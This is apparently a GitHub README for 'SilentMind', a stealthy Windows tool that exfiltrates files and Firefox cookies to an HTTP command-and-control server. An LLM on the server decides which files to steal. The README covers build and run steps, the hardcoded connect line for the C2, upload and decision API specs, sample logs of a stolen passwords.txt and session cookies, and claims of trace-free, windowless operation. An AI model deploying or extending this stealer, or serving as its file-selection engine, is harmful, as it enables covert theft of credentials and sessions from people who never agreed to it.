# SilentMind 🔥

A stealthy red team tool for automated file and cookie exfiltration with AI-powered decision making.

## 🎯 Overview

SilentMind is a Windows client-server application that intelligently identifies and exfiltrates sensitive files and browser cookies from target machines. It uses an LLM (Large Language Model) to make smart decisions about which files to exfiltrate based on their content and context.

## ✨ Features

- **🤖 AI-Powered Decision Making** - Uses Ollama/OpenAI to intelligently select files for exfiltration
- **🍪 Firefox Cookie Extraction** - Extracts readable cookies with full metadata
- **🔒 XOR Encryption** - All data is encrypted before transmission
- **📁 File Exfiltration** - Scans Documents folder for sensitive files
- **🌐 HTTP C2 Communication** - Simple HTTP-based command and control
- **🔄 Automatic Decryption** - Server automatically decrypts received data
- **📊 Clean Output** - Human-readable cookie and file data

## 🏗️ Architecture
<img width="1536" height="1024" alt="image" src="https://github.com/user-attachments/assets/b7b6835a-0aee-4bd1-a494-1f01578dd32f" />

```
┌─────────────────┐    HTTP POST    ┌─────────────────┐
│   Windows       │ ──────────────► │         Server  │
│                 │                 │                 │
│  silentmind.exe │                 │   Python Flask  │
│                 │                 │                 │
│  • File Scanner │                 │  • LLM Decision │
│  • Cookie Extr. │                 │  • Data Storage │
│  • XOR Encrypt  │                 │  • Auto Decrypt │
└─────────────────┘                 └─────────────────┘
```

## 📁 Project Structure and Workflow

```
SilentMind/
├── client/                    # Windows client source code
│   ├── main.c                # Main client application
│   ├── encrypt.c/.h          # XOR encryption functions
│   ├── exfil_http.c          # HTTP exfiltration functions
│   └── firefox_cookies.c/.h  # Firefox cookie extraction
├── server/                   # Python server
│   ├── llm.py               # LLM integration (Ollama/OpenAI)
│   └── routes/
│       ├── decision.py      # File decision endpoint
│       └── upload.py        # File upload endpoint
├── loot/                    # Exfiltrated data storage
├── tools/                   # Utility scripts
├── sqlite3.c/.h            # SQLite library for cookie parsing
├── compile_windows.sh      # Cross-compilation script
├── requirements.txt        # Python dependencies
└── app.py                  # Main server application
```
<img width="1536" height="1024" alt="image" src="https://github.com/user-attachments/assets/7a45948e-d28e-437f-a85d-c3b599b1e692" />

## 🚀 Quick Start

### Prerequisites

- **server(linux/windows)** (for compilation and server)
- **Windows** (for client execution)
- **Python 3.7+**
- **mingw-w64** (for cross-compilation)

### Installation

1. **Clone the repository:**
```bash
git clone https://github.com/0xFFF-cmd/SilentMind.git
cd SilentMind
```

2. **Install Python dependencies:**
```bash
pip3 install -r requirements.txt
```

3. **Configure environment:**
```bash
# Edit .env with your API keys
```

4. **Compile Windows client:**
```bash
./compile_windows.sh
```

### Running the Application

1. **Start the server:**
```bash
python3 app.py
```

2. **Run the client (Windows):**
```bash
# Copy silentmind.exe to Windows 
silentmind.exe
```

## 🔧 Configuration

### Environment Variables (.env)

```bash
# OpenAI API Configuration
OPENAI_API_KEY=your_openai_api_key_here

```

### Client Configuration

Update the server IP in `client/main.c` line 165:
```c
HINTERNET hConnect = InternetConnect(hSession, "192.168.1.12", 8000, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
```

## 📊 Demonstration

### 1. File Exfiltration Process

**Step 1: Client scans Documents folder**
```
[+] Scanning C:\Users\FarisFisal\Documents\
[+] Found 3 files:
  - desktop.ini (402 bytes)
  - faristext.txt (0 bytes)  
  - passwords.txt (14 bytes)
```

**Step 2: LLM makes intelligent decision**
```json
{
  "exfiltrate": ["passwords.txt"],
  "reasons": {
    "passwords.txt": "Contains sensitive information (potential credentials) that might be valuable to the red team objectives."
  }
}
```

**Step 3: File is encrypted and uploaded**
```
[+] Exfiltrated file saved to loot/20250909-092732__passwords.txt (14 bytes)
[+] Decrypted file saved to loot/20250909-092732__passwords.recovered.txt
```

### 2. Firefox Cookie Extraction

**Step 1: Profile detection**
```
[+] Found Firefox profile: C:\Users\TestUser\AppData\Roaming\Mozilla\Firefox\Profiles\6vnwghj5.default-release
[+] Found cookies.sqlite database
```

**Step 2: Cookie extraction and formatting**
```
=== FIREFOX COOKIES ===
Database: C:\Users\TestUserX\AppData\Roaming\Mozilla\Firefox\Profiles\6vnwghj5.default-release\cookies.sqlite

Cookie #1:
  Domain: .example.com
  Name: XSRF-TOKEN
  Value: eyJpdiI6IjUvU05PNEJObzZoSWtIYmFUeHlnaHc9PSIsInZhbHVlIjA0OTU4MzY1YmQ1M2JlOTZjZGNkZjg2YjYyNTIyNzYxMjFlZmQzZDQ2ZjNkZTc0IiwidGFnIjoiIn0%3D
  Path: /
  Expires: 1757319429160
  Secure: 1
  HttpOnly: 0

Cookie #2:
  Domain: .example.com
  Name: cyberX_session
  Value: eyJpdiI6InlTeXXX4NDNmYzk3NTk4MTNlOTNkMjA0OTU0OGE1ZDllYzk3IiwidGFnIjoiIn0%3D
  Path: /
  Expires: 1757319429160
  Secure: 1
  HttpOnly: 1
```

### 3. Server-Side Processing

**Step 1: LLM Decision API**
```
== [DECISION API HIT] ==
HEADERS: Content-Type: application/json
RAW BODY: {"fingerprint": {"user": "FarisFisalXXX", "host": "DESKTOP-XXXX", "os": "Windows"}, "files": [...]}
[LLM DECISION RAW]: {"exfiltrate": ["passwords.txt"], "reasons": {...}}
```

**Step 2: File Upload and Decryption**
```
[+] Exfiltrated file saved to loot/20250909-092732__passwords.txt (14 bytes)
[DEBUG] Read 14 bytes for decryption
[+] Decrypted file saved to loot/20250909-092732__passwords.recovered.txt
```

## 🔒 Security Features

- **XOR Encryption** - All data encrypted with "SILENTMIND" key
- **Temporary File Cleanup** - No traces left on target system
- **Database Copying** - Handles locked Firefox databases
- **Error Handling** - Graceful failure without crashes
- **Stealth Operation** - No visible windows or alerts

## 🛠️ Development

### Compilation

**Cross-compile from to Windows:**
```bash
./compile_windows.sh
```

**Compile on Windows:**
```bash
compile_windows.bat
```

**Using Makefile:**
```bash
make all
```

### Adding New Features

1. **New Browser Support** - Add to `client/firefox_cookies.c`
2. **New Data Sources** - Create new extraction modules
3. **Server Enhancements** - Modify `server/routes/`
4. **LLM Prompts** - Update `server/llm.py`

## 📋 API Endpoints

### POST /api/decision
**Purpose:** Get LLM decision on which files to exfiltrate

**Request:**
```json
{
  "fingerprint": {
    "user": "username",
    "host": "computername", 
    "os": "Windows"
  },
  "files": [
    {
      "name": "filename.txt",
      "path": "C:\\Users\\...\\filename.txt",
      "size": 1024,
      "modified": "2025-01-01 12:00"
    }
  ]
}
```

**Response:**
```json
{
  "exfiltrate": ["filename.txt"],
  "reasons": {
    "filename.txt": "Contains sensitive information..."
  }
}
```

### POST /api/upload
**Purpose:** Upload encrypted files and cookies

**Headers:**
- `Content-Type: application/octet-stream`
- `X-Filename: filename.txt` (or `X-Filename-B64: base64_encoded_name`)

**Body:** XOR-encrypted file data

## 🎯 Use Cases

- **Red Team Operations** - Automated data collection
- **Penetration Testing** - Post-exploitation data gathering
- **Security Research** - Browser security analysis
- **Incident Response** - Evidence collection
- **Threat Hunting** - Suspicious activity detection

## ⚠️ Legal Disclaimer

This tool is for educational and authorized testing purposes only. Users are responsible for complying with all applicable laws and regulations. The authors are not responsible for any misuse of this software.

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Add tests if applicable
5. Submit a pull request

## 📄 License

This project is licensed under the MIT License - see the LICENSE file for details.

## 🙏 Acknowledgments

- SQLite team for the excellent database library
- Ollama and OpenAI for LLM capabilities
- The open-source community for inspiration

---

**Made with ❤️ for the security community**
